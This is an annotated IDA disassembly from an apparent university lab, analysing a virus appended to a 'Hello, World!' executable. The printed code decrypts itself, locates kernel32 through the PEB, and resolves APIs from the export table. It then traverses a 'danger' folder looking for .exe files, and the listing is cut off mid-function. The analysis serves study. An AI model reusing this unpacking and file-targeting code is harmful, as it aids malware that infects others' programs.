.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
.text:00401000 ; |           Copyright (c) 2022 Hex-Rays, <support@hex-rays.com>           |
.text:00401000 ; |                      License info: 48-BABB-7E64-E2                      |
.text:00401000 ; |                     Georgia Institute of Technology                     |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input SHA256 : 16173BBACDA90883EEF90566D4B77F1CA9CAF95CCDF5F561EA4E2CE61EC1B400
.text:00401000 ; Input MD5    : D0D857C46ED4B103C74E4429D07A36F1
.text:00401000 ; Input CRC32  : F5B6D372
.text:00401000
.text:00401000 ; File Name   : /nethome/ankemla3/Desktop/ECE4117/lab6/suspiciousunpacked.exe
.text:00401000 ; Format      : Portable executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Timestamp   : 49C7EA12 (Mon Mar 23 19:59:14 2009)
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 00000026 (     38.)
.text:00401000 ; Section size in file          : 00000200 (    512.)
.text:00401000 ; Offset to raw data for section: 00000400
.text:00401000 ; Flags 60000020: Text Executable Readable
.text:00401000 ; Alignment     : default
.text:00401000
.text:00401000                 .686p
.text:00401000                 .mmx
.text:00401000                 .model flat
.text:00401000
.text:00401000 ; ===========================================================================
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Execute
.text:00401000 _text           segment para public 'CODE' use32
.text:00401000                 assume cs:_text
.text:00401000                 ;org 401000h
.text:00401000                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401000
.text:00401000 ; =============== S U B R O U T I N E =======================================
.text:00401000
.text:00401000
.text:00401000                 public start
.text:00401000 start           proc near               ; DATA XREF: fileHandler+1B9↓o
.text:00401000                 push    0
.text:00401002                 push    offset aHello   ; "Hello"
.text:00401007                 push    offset aHelloWorld ; "Hello, World!"
.text:0040100C                 push    0
.text:0040100E                 call    sub_403014
.text:00401013                 push    0               ; uExitCode
.text:00401015                 call    ExitProcess
.text:0040101A ; ---------------------------------------------------------------------------
.text:0040101A
.text:0040101A loc_40101A:                             ; CODE XREF: sub_403014+C9B↓j
.text:0040101A                                         ; DATA XREF: sub_403014:loc_403CAA↓o
.text:0040101A                 jmp     ds:MessageBoxA
.text:0040101A start           endp
.text:0040101A
.text:00401020 ; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00401026                 align 4
.text:00401028                 dd 0Eh dup(0)
.text:00401060                 db 0
.text:00401061                 dd 0
.text:00401065                 align 200h
.text:00401200                 dd 157h dup(?)
.text:0040175C                 db 3 dup(?)
.text:0040175F dword_40175F    dd ?                    ; DATA XREF: fileHandler+15E↓w
.text:0040175F                                         ; fileHandler+1B3↓r
.text:00401763 dword_401763    dd ?                    ; DATA XREF: fileHandler+16A↓w
.text:00401763                                         ; fileHandler+29F↓r
.text:00401767 dword_401767    dd ?                    ; DATA XREF: fileHandler+26D↓w
.text:00401767                                         ; fileHandler+289↓w ...
.text:0040176B dword_40176B    dd ?                    ; DATA XREF: fileHandler+216↓w
.text:0040176B                                         ; fileHandler+293↓r ...
.text:0040176F                 db ?
.text:00401770                 dd 3 dup(?)
.text:0040177C                 dd ?
.text:00401780                 dd 7 dup(?)
.text:0040179C                 db 3 dup(?)
.text:0040179F dword_40179F    dd ?                    ; DATA XREF: recursivetraversal+E↓r
.text:004017A3                 db ?
.text:004017A4                 dd 2 dup(?)
.text:004017AC                 db 2 dup(?)
.text:004017AE                 dd ?
.text:004017B2                 dw ?
.text:004017B4                 dd 2 dup(?)
.text:004017BC                 db ?
.text:004017BD dword_4017BD    dd ?                    ; DATA XREF: fileHandler+19↓r
.text:004017C1                 db 3 dup(?)
.text:004017C4                 dd 3 dup(?)
.text:004017D0                 db 3 dup(?)
.text:004017D3 dword_4017D3    dd ?                    ; DATA XREF: fileHandler+65↓r
.text:004017D7                 db ?
.text:004017D8                 dd 3 dup(?)
.text:004017E4                 db ?
.text:004017E5 dword_4017E5    dd ?                    ; DATA XREF: fileHandler+86↓r
.text:004017E9                 db 3 dup(?)
.text:004017EC                 dd 4 dup(?)
.text:004017FC                 db ?
.text:004017FD dword_4017FD    dd ?                    ; DATA XREF: recursivetraversal+8E↓r
.text:004017FD                                         ; recursivetraversal+A4↓r
.text:00401801                 db 3 dup(?)
.text:00401804                 dd 3 dup(?)
.text:00401810                 db 3 dup(?)
.text:00401813 dword_401813    dd ?                    ; DATA XREF: .data:00403312↓r
.text:00401817                 db ?
.text:00401818                 dd 4 dup(?)
.text:00401828 dword_401828    dd ?                    ; DATA XREF: .data:00403320↓r
.text:0040182C                 dd 2 dup(?)
.text:00401834                 db 3 dup(?)
.text:00401837                 dd ?
.text:0040183B                 db ?
.text:0040183C                 dd 2 dup(?)
.text:00401844                 db 3 dup(?)
.text:00401847                 dd ?
.text:0040184B                 db ?
.text:0040184C                 dd 2 dup(?)
.text:00401854                 db ?
.text:00401855                 dd ?
.text:00401859                 db 3 dup(?)
.text:0040185C                 dd 2 dup(?)
.text:00401864                 db 2 dup(?)
.text:00401866                 dd ?
.text:0040186A                 dw ?
.text:0040186C                 dd 3 dup(?)
.text:00401878                 db 2 dup(?)
.text:0040187A dword_40187A    dd ?                    ; DATA XREF: fileHandler+C7↓r
.text:0040187A                                         ; fileHandler+2F2↓r
.text:0040187E                 dw ?
.text:00401880                 dd 2 dup(?)
.text:00401888                 db 2 dup(?)
.text:0040188A dword_40188A    dd ?                    ; DATA XREF: fileHandler+D6↓r
.text:0040188A                                         ; fileHandler+E5↓r ...
.text:0040188E                 dw ?
.text:00401890                 dd 2 dup(?)
.text:00401898                 db 3 dup(?)
.text:0040189B                 dd ?
.text:0040189F                 db ?
.text:004018A0                 dd 2 dup(?)
.text:004018A8                 db 3 dup(?)
.text:004018AB dword_4018AB    dd ?                    ; DATA XREF: fileHandler+37↓r
.text:004018AF                 db ?
.text:004018B0                 dd 3 dup(?)
.text:004018BC                 db ?
.text:004018BD dword_4018BD    dd ?                    ; DATA XREF: recursivetraversal+25↓r
.text:004018C1                 db 3 dup(?)
.text:004018C4                 dd 3 dup(?)
.text:004018D0                 db 3 dup(?)
.text:004018D3 dword_4018D3    dd ?                    ; DATA XREF: recursivetraversal+6E↓r
.text:004018D7                 db ?
.text:004018D8                 dd 3 dup(?)
.text:004018E4 dword_4018E4    dd ?                    ; DATA XREF: recursivetraversal+52↓r
.text:004018E8                 dd 2 dup(?)
.text:004018F0                 db 2 dup(?)
.text:004018F2                 dd ?
.text:004018F6                 dw ?
.text:004018F8                 dd 0ACh dup(?)
.text:00401BA8                 db ?
.text:00401BA9 dword_401BA9    dd ?                    ; DATA XREF: fileHandler+21↓w
.text:00401BA9                                         ; fileHandler+5E↓r ...
.text:00401BAD dword_401BAD    dd ?                    ; DATA XREF: fileHandler+6D↓w
.text:00401BAD                                         ; fileHandler+7F↓r ...
.text:00401BB1 dword_401BB1    dd ?                    ; DATA XREF: fileHandler+8E↓w
.text:00401BB1                                         ; fileHandler+C0↓r ...
.text:00401BB5                 dd ?
.text:00401BB9                 dd ?
.text:00401BBD                 db 3 dup(?)
.text:00401BC0                 db ?
.text:00401BC1 dword_401BC1    dd ?                    ; DATA XREF: fileHandler+A7↓w
.text:00401BC1                                         ; fileHandler+115↓r ...
.text:00401BC5 dword_401BC5    dd ?                    ; DATA XREF: fileHandler+B0↓w
.text:00401BC5                                         ; fileHandler+13A↓r ...
.text:00401BC9 dword_401BC9    dd ?                    ; DATA XREF: fileHandler+FD↓w
.text:00401BC9                                         ; fileHandler:loc_40366F↓r
.text:00401BCD dword_401BCD    dd ?                    ; DATA XREF: fileHandler+27A↓w
.text:00401BD1 dword_401BD1    dd ?                    ; DATA XREF: fileHandler+F4↓w
.text:00401BD1                                         ; fileHandler+25E↓r ...
.text:00401BD5 dword_401BD5    dd ?                    ; DATA XREF: fileHandler+246↓w
.text:00401BD9 dword_401BD9    dd ?                    ; DATA XREF: fileHandler+143↓w
.text:00401BD9                                         ; fileHandler+1A5↓r
.text:00401BDD dword_401BDD    dd ?                    ; DATA XREF: fileHandler+14C↓w
.text:00401BE1                 db 3 dup(?)
.text:00401BE4                 db ?
.text:00401BE5 dword_401BE5    dd ?                    ; DATA XREF: randomNumGen↓r
.text:00401BE5                                         ; randomNumGen+29↓w ...
.text:00401BE9                 db 3 dup(?)
.text:00401BEC                 db ?
.text:00401BED byte_401BED     db 3 dup(?)             ; DATA XREF: recursivetraversal+1E↓o
.text:00401BF0                 db ?
.text:00401BF1 byte_401BF1     db 3 dup(?)             ; DATA XREF: recursivetraversal+9D↓o
.text:00401BF4                 dd 5 dup(?)
.text:00401C08 dword_401C08    dd ?                    ; DATA XREF: recursivetraversal+B9↓w
.text:00401C08                                         ; fileHandler+12↓r
.text:00401C0C dword_401C0C    dd ?                    ; DATA XREF: fileHandler+49↓w
.text:00401C0C                                         ; fileHandler+51↓r ...
.text:00401C10 dword_401C10    dd ?                    ; DATA XREF: fileHandler+109↓w
.text:00401C10                                         ; fileHandler+10F↓r ...
.text:00401C14                 dd 0FBh dup(?)
.text:00401C14 _text           ends
.text:00401C14
.idata:00402000 ; Section 2. (virtual address 00002000)
.idata:00402000 ; Virtual size                  : 00000092 (    146.)
.idata:00402000 ; Section size in file          : 00000200 (    512.)
.idata:00402000 ; Offset to raw data for section: 00000600
.idata:00402000 ; Flags 40000040: Data Readable
.idata:00402000 ; Alignment     : default
.idata:00402000 ;
.idata:00402000 ; Imports from kernel32.dll
.idata:00402000 ;
.idata:00402000 ; ===========================================================================
.idata:00402000
.idata:00402000 ; Segment type: Externs
.idata:00402000 ; _idata
.idata:00402000 ; void (__stdcall __noreturn *ExitProcess)(UINT uExitCode)
.idata:00402000                 extrn __imp_ExitProcess:dword
.idata:00402000                                         ; DATA XREF: ExitProcess↑r
.idata:00402000                                         ; .rdata:00402034↓o
.idata:00402004
.idata:00402008 ;
.idata:00402008 ; Imports from user32.dll
.idata:00402008 ;
.idata:00402008 ; int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
.idata:00402008                 extrn MessageBoxA:dword ; DATA XREF: start:loc_40101A↑r
.idata:00402008                                         ; .rdata:00402020↓o
.idata:0040200C
.idata:0040200C
.rdata:00402010 ; ===========================================================================
.rdata:00402010
.rdata:00402010 ; Segment type: Pure data
.rdata:00402010 ; Segment permissions: Read
.rdata:00402010 _rdata          segment para public 'DATA' use32
.rdata:00402010                 assume cs:_rdata
.rdata:00402010                 ;org 402010h
.rdata:00402010 __IMPORT_DESCRIPTOR_user32 dd rva off_402054 ; Import Name Table
.rdata:00402014                 dd 0                    ; Time stamp
.rdata:00402018                 dd 0                    ; Forwarder Chain
.rdata:0040201C                 dd rva aUser32Dll       ; DLL Name
.rdata:00402020                 dd rva MessageBoxA      ; Import Address Table
.rdata:00402024 __IMPORT_DESCRIPTOR_kernel32 dd rva off_40204C ; Import Name Table
.rdata:00402028                 dd 0                    ; Time stamp
.rdata:0040202C                 dd 0                    ; Forwarder Chain
.rdata:00402030                 dd rva aKernel32Dll     ; DLL Name
.rdata:00402034                 dd rva __imp_ExitProcess ; Import Address Table
.rdata:00402038                 db    0
.rdata:00402039                 db    0
.rdata:0040203A                 db    0
.rdata:0040203B                 db    0
.rdata:0040203C                 db    0
.rdata:0040203D                 db    0
.rdata:0040203E                 db    0
.rdata:0040203F                 db    0
.rdata:00402040                 db    0
.rdata:00402041                 db    0
.rdata:00402042                 db    0
.rdata:00402043                 db    0
.rdata:00402044                 db    0
.rdata:00402045                 db    0
.rdata:00402046                 db    0
.rdata:00402047                 db    0
.rdata:00402048                 db    0
.rdata:00402049                 db    0
.rdata:0040204A                 db    0
.rdata:0040204B                 db    0
.rdata:0040204C ;
.rdata:0040204C ; Import names for kernel32.dll
.rdata:0040204C ;
.rdata:0040204C off_40204C      dd rva word_402076      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_kernel32↑o
.rdata:00402050                 dd 0
.rdata:00402054 ;
.rdata:00402054 ; Import names for user32.dll
.rdata:00402054 ;
.rdata:00402054 off_402054      dd rva word_40205C      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_user32↑o
.rdata:00402058                 dd 0
.rdata:0040205C word_40205C     dw 1B1h                 ; DATA XREF: .rdata:off_402054↑o
.rdata:0040205E                 db 'MessageBoxA',0
.rdata:0040206A aUser32Dll      db 'user32.dll',0       ; DATA XREF: .rdata:0040201C↑o
.rdata:00402075                 align 2
.rdata:00402076 word_402076     dw 9Bh                  ; DATA XREF: .rdata:off_40204C↑o
.rdata:00402078                 db 'ExitProcess',0
.rdata:00402084 aKernel32Dll    db 'kernel32.dll',0     ; DATA XREF: .rdata:00402030↑o
.rdata:00402091                 align 1000h
.rdata:00402091 _rdata          ends
.rdata:00402091
.data:00403000 ; Section 3. (virtual address 00003000)
.data:00403000 ; Virtual size                  : 00000CAA (   3242.)
.data:00403000 ; Section size in file          : 00000E9D (   3741.)
.data:00403000 ; Offset to raw data for section: 00000800
.data:00403000 ; Flags C0000040: Data Readable Writable
.data:00403000 ; Alignment     : default
.data:00403000 ; ===========================================================================
.data:00403000
.data:00403000 ; Segment type: Pure data
.data:00403000 ; Segment permissions: Read/Write
.data:00403000 _data           segment para public 'DATA' use32
.data:00403000                 assume cs:_data
.data:00403000                 ;org 403000h
.data:00403000 aHelloWorld     db 'Hello, World!',0    ; DATA XREF: start+7↑o
.data:0040300E aHello          db 'Hello',0            ; DATA XREF: start+2↑o
.data:00403014
.data:00403014 ; =============== S U B R O U T I N E =======================================
.data:00403014
.data:00403014
.data:00403014 sub_403014      proc near               ; CODE XREF: start+E↑p
.data:00403014
.data:00403014 ; FUNCTION CHUNK AT .data:004032EB SIZE 00000027 BYTES
.data:00403014 ; FUNCTION CHUNK AT .data:00403C28 SIZE 00000053 BYTES
.data:00403014 ; FUNCTION CHUNK AT .data:00403CAA SIZE 00000006 BYTES
.data:00403014
.data:00403014                 call    $+5             ; call instruction 403019
.data:00403019
.data:00403019 loc_403019:                             ; DATA XREF: sub_403014+6↓o
.data:00403019                 pop     ebp             ; ebp = 403019h
.data:0040301A                 sub     ebp, 401005h    ; ebp=2014h
.data:00403020                 cmp     dword ptr [ebp+401061h], 0 ; check if data at 401061+2014=103075h is null
.data:00403027                 jnz     short unpacking ; if not null jump
.data:00403029                 jmp     short loc_403079
.data:0040302B ; ---------------------------------------------------------------------------
.data:0040302B
.data:0040302B unpacking:                              ; CODE XREF: sub_403014+13↑j
.data:0040302B                 mov     ecx, 0C31h
.data:00403030                 lea     esi, [ebp+401065h]
.data:00403036                 mov     edi, esi
.data:00403038
.data:00403038 unpackingloop:                          ; CODE XREF: sub_403014+5D↓j
.data:00403038                 lodsb                   ; loop to unpack the malware
.data:00403039                 push    eax
.data:0040303A                 push    ecx
.data:0040303B                 mov     eax, [ebp+401061h]
.data:00403041                 xor     edx, edx
.data:00403043                 mov     ecx, 1F31Dh
.data:00403048                 div     ecx
.data:0040304A                 mov     ecx, eax
.data:0040304C                 mov     eax, 41A7h
.data:00403051                 mul     edx
.data:00403053                 mov     edx, ecx
.data:00403055                 mov     ecx, eax
.data:00403057                 mov     eax, 0B14h
.data:0040305C                 mul     edx
.data:0040305E                 sub     ecx, eax
.data:00403060                 xor     edx, edx
.data:00403062                 mov     eax, ecx
.data:00403064                 mov     [ebp+401061h], ecx
.data:0040306A                 mov     edx, eax
.data:0040306C                 pop     ecx
.data:0040306D                 pop     eax
.data:0040306E                 xor     al, dl
.data:00403070                 stosb
.data:00403071                 loop    unpackingloop
.data:00403073                 jmp     short loc_403079
.data:00403073 ; ---------------------------------------------------------------------------
.data:00403075                 db  37h ; 7
.data:00403076                 db  92h
.data:00403077                 db  10h
.data:00403078                 db  3Ch ; <
.data:00403079 ; ---------------------------------------------------------------------------
.data:00403079
.data:00403079 loc_403079:                             ; CODE XREF: sub_403014+15↑j
.data:00403079                                         ; sub_403014+5F↑j
.data:00403079                 push    esi             ; save esi
.data:0040307A                 xor     eax, eax        ; eax=0
.data:0040307C                 mov     eax, fs:[eax+30h] ; 0x30 offset is the linear address of Process Environment Block
.data:00403080                 test    eax, eax        ; checks if eax=eax?
.data:00403080                                         ; checks if process is being debugged
.data:00403082                 js      short findBasePtr ; jump if signed based on zf
.data:00403084                 mov     eax, [eax+0Ch]  ; else eax = the ldr data pointer of the PEB (A pointer to a PEB_LDR_DATA structure providing information about loaded modules)
.data:00403087                 mov     esi, [eax+1Ch]  ; esi=pointer to the first PEB entry
.data:0040308A                 lodsd                   ; Load doubleword at address ds:esi into EAX
.data:0040308B                 mov     eax, [eax+8]    ; eax=module base
.data:0040308E                 jmp     short searchingFunctions
.data:00403090 ; ---------------------------------------------------------------------------
.data:00403090
.data:00403090 findBasePtr:                            ; CODE XREF: sub_403014+6E↑j
.data:00403090                 mov     eax, [eax+34h]  ; eax=library list pointer
.data:00403093                 lea     eax, [eax+7Ch]  ; lea address of library list pointer +7ch...
.data:00403096                 mov     eax, [eax+3Ch]  ; ...+3ch which is the base for the libraries that lucius will be looking up
.data:00403099
.data:00403099 searchingFunctions:                     ; CODE XREF: sub_403014+7A↑j
.data:00403099                 pop     esi             ; restore esi
.data:0040309A                 mov     [ebp+401BB9h], eax ; store library base in mem at addr ebp(2014)+401BB9h
.data:004030A0                 lea     esi, [ebp+401770h] ; [ebp+401770h]->LoadLibrary string
.data:004030A0                                         ; point esi to the string of the desired function
.data:004030A6                 call    searchForFunction ; return pointer to function LoadLibrary
.data:004030AB                 mov     [ebp+40177Ch], eax ; move it to [ebp+40177Ch]
.data:004030B1                 mov     eax, [ebp+401BB9h] ; restore library  base to eax
.data:004030B7                 lea     esi, [ebp+401801h] ; "GetCurrentProcess"
.data:004030BD                 call    searchForFunction ; return pointer to the function name in esi
.data:004030C2                 mov     [ebp+401813h], eax ; store ptr in [ebp+401813h]
.data:004030C8                 mov     eax, [ebp+401BB9h] ; restore library base ptr
.data:004030CE                 lea     esi, [ebp+401817h] ; "SetPriorityClass"
.data:004030CE                                         ; For every similar call  below:
.data:004030CE                                         ; restore library base
.data:004030CE                                         ; grab function string you want to get
.data:004030CE                                         ; call search for function ptr
.data:004030CE                                         ; store ptr in memory
.data:004030D4                 call    searchForFunction
.data:004030D9                 mov     [ebp+401828h], eax
.data:004030DF                 mov     eax, [ebp+401BB9h]
.data:004030E5                 lea     esi, [ebp+4018AFh] ; "FindFirstFile"
.data:004030EB                 call    searchForFunction
.data:004030F0                 mov     [ebp+4018BDh], eax
.data:004030F6                 mov     eax, [ebp+401BB9h]
.data:004030FC                 lea     esi, [ebp+4017E9h] ; "SetCurrentDirectory"
.data:00403102                 call    searchForFunction
.data:00403107                 mov     [ebp+4017FDh], eax
.data:0040310D                 mov     eax, [ebp+401BB9h]
.data:00403113                 lea     esi, [ebp+4018C1h] ; "GetFileAttributes"
.data:00403119                 call    searchForFunction
.data:0040311E                 mov     [ebp+4018D3h], eax
.data:00403124                 mov     eax, [ebp+401BB9h]
.data:0040312A                 lea     esi, [ebp+4018D7h] ; "FindNextFile"
.data:00403130                 call    searchForFunction
.data:00403135                 mov     [ebp+4018E4h], eax
.data:0040313B                 mov     eax, [ebp+401BB9h]
.data:00403141                 lea     esi, [ebp+4018E8h] ; "FindClose"
.data:00403147                 call    searchForFunction
.data:0040314C                 mov     [ebp+4018F2h], eax
.data:00403152                 mov     eax, [ebp+401BB9h]
.data:00403158                 lea     esi, [ebp+401793h] ; "GlobalAlloc"
.data:0040315E                 call    searchForFunction
.data:00403163                 mov     [ebp+40179Fh], eax
.data:00403169                 mov     eax, [ebp+401BB9h]
.data:0040316F                 lea     esi, [ebp+4017A3h] ; "GlobalFree"
.data:00403175                 call    searchForFunction
.data:0040317A                 mov     [ebp+4017AEh], eax
.data:00403180                 mov     eax, [ebp+401BB9h]
.data:00403186                 lea     esi, [ebp+4017B2h] ; "CreateFile"
.data:0040318C                 call    searchForFunction
.data:00403191                 mov     [ebp+4017BDh], eax
.data:00403197                 mov     eax, [ebp+401BB9h]
.data:0040319D                 lea     esi, [ebp+40188Eh] ; "GetTickCount"
.data:004031A3                 call    searchForFunction
.data:004031A8                 mov     [ebp+40189Bh], eax
.data:004031AE                 mov     eax, [ebp+401BB9h]
.data:004031B4                 lea     esi, [ebp+40183Bh] ; "CreateMutex"
.data:004031BA                 call    searchForFunction
.data:004031BF                 mov     [ebp+401847h], eax
.data:004031C5                 mov     eax, [ebp+401BB9h]
.data:004031CB                 lea     esi, [ebp+40184Bh] ; "OpenMutex"
.data:004031D1                 call    searchForFunction
.data:004031D6                 mov     [ebp+401855h], eax
.data:004031DC                 mov     eax, [ebp+401BB9h]
.data:004031E2                 lea     esi, [ebp+401859h] ; "ReleaseMutex"
.data:004031E8                 call    searchForFunction
.data:004031ED                 mov     [ebp+401866h], eax
.data:004031F3                 mov     eax, [ebp+401BB9h]
.data:004031F9                 lea     esi, [ebp+40189Fh] ; "GetFileSize"
.data:004031FF                 call    searchForFunction
.data:00403204                 mov     [ebp+4018ABh], eax
.data:0040320A                 mov     eax, [ebp+401BB9h]
.data:00403210                 lea     esi, [ebp+4017C1h] ; "CreateFileMapping"
.data:00403216                 call    searchForFunction
.data:0040321B                 mov     [ebp+4017D3h], eax
.data:00403221                 mov     eax, [ebp+401BB9h]
.data:00403227                 lea     esi, [ebp+4017D7h] ; "MapViewOfFile"
.data:0040322D                 call    searchForFunction
.data:00403232                 mov     [ebp+4017E5h], eax
.data:00403238                 mov     eax, [ebp+401BB9h]
.data:0040323E                 lea     esi, [ebp+40186Ah] ; "UnmapViewOfFile"
.data:00403244                 call    searchForFunction
.data:00403249                 mov     [ebp+40187Ah], eax
.data:0040324F                 mov     eax, [ebp+401BB9h]
.data:00403255                 lea     esi, [ebp+40187Eh] ; "CloseHandle"
.data:0040325B                 call    searchForFunction
.data:00403260                 mov     [ebp+40188Ah], eax
.data:00403266                 jmp     setDirectory_danger
.data:00403266 sub_403014      endp
.data:00403266
.data:0040326B
.data:0040326B ; =============== S U B R O U T I N E =======================================
.data:0040326B
.data:0040326B
.data:0040326B searchForFunction proc near             ; CODE XREF: sub_403014+92↑p
.data:0040326B                                         ; sub_403014+A9↑p ...
.data:0040326B                 mov     ebx, [eax+3Ch]  ; store base for the libraries in ebx
.data:0040326E                 add     ebx, eax        ; ebx+eax...
.data:00403270                 add     ebx, 78h ; 'x'  ; ...+ebx
.data:00403273                 mov     ebx, [ebx]
.data:00403275                 add     ebx, eax
.data:00403277                 xor     edx, edx        ; initialize trials at 0
.data:00403279                 mov     ecx, [ebx+20h]
.data:0040327C                 add     ecx, eax
.data:0040327E                 push    esi             ; store esi on stack
.data:0040327E                                         ; esi is pointer to the search string
.data:0040327F                 push    edx             ; store edx on stack
.data:0040327F                                         ; edx is the number of attempted functions until the correct one is found
.data:00403280
.data:00403280 setupForFailure:                        ; CODE XREF: searchForFunction+27↓j
.data:00403280                 pop     edx             ; push then immediately pop?
.data:00403281                 pop     esi             ; restore esi
.data:00403282                 inc     edx             ; increment num of failures to find funct
.data:00403283                 mov     edi, [ecx]      ; edi=function offset...
.data:00403285                 add     edi, eax        ; ...+ base address for the module
.data:00403285                                         ; this essentially points to the string name of the module
.data:00403287                 add     ecx, 4          ; in case of failure grab next module name
.data:0040328A                 push    esi
.data:0040328B                 push    edx             ; store  esi and edx on stack
.data:0040328C
.data:0040328C checkCharOfModules:                     ; CODE XREF: searchForFunction+30↓j
.data:0040328C                 mov     dl, [edi]       ; store module string's cursor youre at  in dh
.data:0040328E                 mov     dh, [esi]       ; store module string's cursor youre looking for in dh
.data:00403290                 cmp     dl, dh          ; check if the module is found
.data:00403292                 jnz     short setupForFailure ; if not found jump to reset for searching function
.data:00403294                 inc     edi             ; increment cursor by a char and keep  checking
.data:00403295                 inc     esi             ; increment cursor by a char to keep checking entire string
.data:00403296                 cmp     byte ptr [esi], 0 ; make sure the string is not complete and null character is not reached
.data:00403299                 jz      short returnPointertoFunction ; if null character reached without reset, name completely matches
.data:0040329B                 jmp     short checkCharOfModules ; else keep checking until all ccharacters in the string has been reached
.data:0040329D ; ---------------------------------------------------------------------------
.data:0040329D
.data:0040329D returnPointertoFunction:                ; CODE XREF: searchForFunction+2E↑j
.data:0040329D                 pop     edx             ; restore edx and esi
.data:0040329E                 pop     esi
.data:0040329F                 dec     edx             ; decrement counter
.data:004032A0                 shl     edx, 1          ; edx=(edx-1)*2
.data:004032A2                 mov     ecx, [ebx+24h]
.data:004032A5                 add     ecx, eax
.data:004032A7                 add     ecx, edx
.data:004032A9                 xor     edx, edx        ; edx=0
.data:004032AB                 mov     dx, [ecx]
.data:004032AE                 shl     edx, 2
.data:004032B1                 mov     ecx, [ebx+1Ch]
.data:004032B4                 add     ecx, eax
.data:004032B6                 add     ecx, edx
.data:004032B8                 add     eax, [ecx]      ; return pointer to the function in eax
.data:004032BA                 retn
.data:004032BA searchForFunction endp
.data:004032BA
.data:004032BB
.data:004032BB ; =============== S U B R O U T I N E =======================================
.data:004032BB
.data:004032BB
.data:004032BB randomNumGen    proc near               ; CODE XREF: fileHandler:isdivisibleby11↓p
.data:004032BB                 mov     eax, ss:dword_401BE5[ebp] ; Use GetTickCount to randomly generate a number like that one other malware we did
.data:004032C1                 xor     edx, edx
.data:004032C3                 mov     ecx, 1F31Dh
.data:004032C8                 div     ecx
.data:004032CA                 mov     ecx, eax
.data:004032CC                 mov     eax, 41A7h
.data:004032D1                 mul     edx
.data:004032D3                 mov     edx, ecx
.data:004032D5                 mov     ecx, eax
.data:004032D7                 mov     eax, 0B14h
.data:004032DC                 mul     edx
.data:004032DE                 sub     ecx, eax
.data:004032E0                 xor     edx, edx
.data:004032E2                 mov     eax, ecx
.data:004032E4                 mov     ss:dword_401BE5[ebp], ecx
.data:004032EA                 retn                    ; return randomly  generated number
.data:004032EA randomNumGen    endp
.data:004032EA
.data:004032EB ; ---------------------------------------------------------------------------
.data:004032EB ; START OF FUNCTION CHUNK FOR sub_403014
.data:004032EB
.data:004032EB setDirectory_danger:                    ; CODE XREF: sub_403014+252↑j
.data:004032EB                 mov     eax, [ebp+40189Bh] ; eax="GetTickCount" call address
.data:004032F1                 call    eax             ; call "GetTickCount"
.data:004032F3                 mov     [ebp+401BE5h], eax ; store returned value in mem (the number of milliseconds that have elapsed since the system was started)
.data:004032F9                 lea     esi, [ebp+401BF4h] ; load "danger" in esi
.data:004032FF                 push    esi             ; store it on stack
.data:00403300                 mov     eax, [ebp+4017FDh] ; eax="SetCurrentDirectory" call address
.data:00403306                 call    eax             ; call "SetCurrentDirectory" to the current directory + "danger" where lucius probably is
.data:00403308                 call    recursivetraversal
.data:0040330D                 jmp     loc_403C28
.data:0040330D ; END OF FUNCTION CHUNK FOR sub_403014
.data:00403312 ; ---------------------------------------------------------------------------
.data:00403312                 mov     eax, ss:dword_401813[ebp]
.data:00403318                 call    eax
.data:0040331A                 mov     ebx, [esp+4]
.data:0040331E                 push    ebx
.data:0040331F                 push    eax
.data:00403320                 mov     eax, ss:dword_401828[ebp]
.data:00403326                 call    eax
.data:00403328                 retn
.data:00403329
.data:00403329 ; =============== S U B R O U T I N E =======================================
.data:00403329
.data:00403329
.data:00403329 checkFileName   proc near               ; CODE XREF: recursivetraversal+BF↓p
.data:00403329                 mov     esi, ecx        ; move file name to esi
.data:0040332B
.data:0040332B findNextChar:                           ; CODE XREF: checkFileName:checknextchar↓j
.data:0040332B                 lodsb                   ; grab first character and move cursor
.data:0040332C                 or      al, al          ; check flags if character is not null
.data:0040332E                 jnz     short nonNullCharFound ; if character is not null jump else ret
.data:00403330                 mov     eax, 0FFFFFFFFh ; set error value
.data:00403335                 jmp     short charFindReturn ; return at the end of file
.data:00403337 ; ---------------------------------------------------------------------------
.data:00403337                 jmp     short checknextchar ; find next char
.data:00403339 ; ---------------------------------------------------------------------------
.data:00403339
.data:00403339 nonNullCharFound:                       ; CODE XREF: checkFileName+5↑j
.data:00403339                 cmp     al, 2Eh ; '.'   ; if the character is a period (2Eh) then end proccess or do something outside of the norm is the vibe im getting from checking the period.
.data:0040333B                 jnz     short checknextchar ; in this case still checking for files that have .exe trying to find the .
.data:0040333D                 jmp     short checkIFExe ; else
.data:0040333F ; ---------------------------------------------------------------------------
.data:0040333F
.data:0040333F checknextchar:                          ; CODE XREF: checkFileName+E↑j
.data:0040333F                                         ; checkFileName+12↑j
.data:0040333F                 jmp     short findNextChar
.data:00403341 ; ---------------------------------------------------------------------------
.data:00403341
.data:00403341 checkIFExe:                             ; CODE XREF: checkFileName+14↑j
.data:00403341                 xor     eax, eax        ; eax=0
.data:00403343                 mov     al, 2Eh ; '.'   ; al=2e or .
.data:00403345                 rol     eax, 8          ; rotate left command= shift left but carry bits over to right and grab next character
.data:00403348                 lodsb
.data:00403349                 rol     eax, 8          ; keep rotating and grabbing next char to check for extension to the filename
.data:0040334C                 lodsb
.data:0040334D                 rol     eax, 8          ; do it three times to check for .exe
.data:00403350                 lodsb
.data:00403351                 cmp     eax, 2E657865h  ; check if eax which is extension after . of filename is "exe"
.data:00403356                 jnz     short notEXERet ; if it is equal then exe file found if not return and try again with other files
.data:00403358                 mov     eax, 1          ; set eax as 1 for confimation prolly
.data:0040335D                 jmp     short charFindReturn ; ret
.data:0040335F ; ---------------------------------------------------------------------------
.data:0040335F
.data:0040335F notEXERet:                              ; CODE XREF: checkFileName+2D↑j
.data:0040335F                 mov     eax, 0          ; set eax as 0 to indicate file not found
.data:00403364
.data:00403364 charFindReturn:                         ; CODE XREF: checkFileName+C↑j
